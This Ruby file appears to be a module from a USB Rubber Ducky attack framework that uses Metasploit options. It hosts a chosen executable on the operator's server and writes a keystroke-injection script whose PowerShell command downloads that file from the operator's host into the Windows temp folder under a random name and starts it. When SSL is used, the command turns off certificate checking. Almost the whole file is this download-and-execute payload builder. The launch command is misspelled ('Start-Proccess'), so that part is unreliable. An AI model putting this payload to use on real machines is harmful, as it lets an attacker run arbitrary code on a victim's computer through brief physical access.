#!/usr/bin/env ruby
require 'skeleton'
require 'metasploit'
class WgetExecute < Skeleton
  include Msf::Options
  attr_reader :ducky
  self.title = 'WGET Execute'
  self.description = 'Download and Execute binary file '

  def setup
    @host = @server_setup.host
    @port = @server_setup.port
    @ssl = @server_setup.use_ssl?
    @executable = ''
    @executable = rgets('Path to Executable: ') while @executable.empty?
    @argument = ''
    until @argument.downcase[0] == 'y' || @argument.downcase[0] == 'n'
      @argument = rgets('Add an argument?[yes/no] ', 'yes')
    end
    @arg = rgets('Input the argument: ') if @argument.downcase[0] == 'y'
  end

  def run
    return unless @server_setup.host_payload?
    server = Server::Start.new(@ssl, @host, @port)
    Thread.new { server.host_file(@executable) }
  end

  def finish
    priv_choice = @ducky_writer.menu
    File.open("#{text_path}#{@file_name}.txt", 'w') do |f|
      f.write(@ducky_writer.write(priv_choice))
      f.write(powershell_wget_powershell(@host, @port, @executable, @arg))
    end
    Ducky::Compile.new("#{@file_name}.txt")
  end

  def powershell_wget_powershell(host, port, executable, argument)
    rand_nam = random_name_gen
    if argument.nil?
      psh_command = download(host, port, executable, rand_nam)
      psh_command << start_proc(rand_nam)
    else
      psh_command = "$arg='#{argument}';"
      psh_command << download(host, port, executable, rand_nam)
      psh_command << start_proc(rand_nam)
      psh_command << '$arg'
    end
    psh_command
  end

  def path(executable)
    "c:\\windows\\temp\\#{executable}"
  end

  def download(host, port, executable, rand_nam)
    executable[0] = '' if executable[0] == '/'
    dl = 'powershell $web=new-object System.Net.WebClient;'
    if @ssl
      dl << '[System.Net.ServicePointManager]::'
      dl << 'ServerCertificateValidationCallback = { $true };'
      dl << "$web.DownloadFile('https://#{host}:#{port}/#{executable}', "
    else
      dl << "$web.DownloadFile('http://#{host}:#{port}/#{executable}', "
    end
    dl << "'#{path(rand_nam)}.exe'); "
  end

  def start_proc(executable)
    "Start-Proccess #{path(executable)}.exe"
  end
end
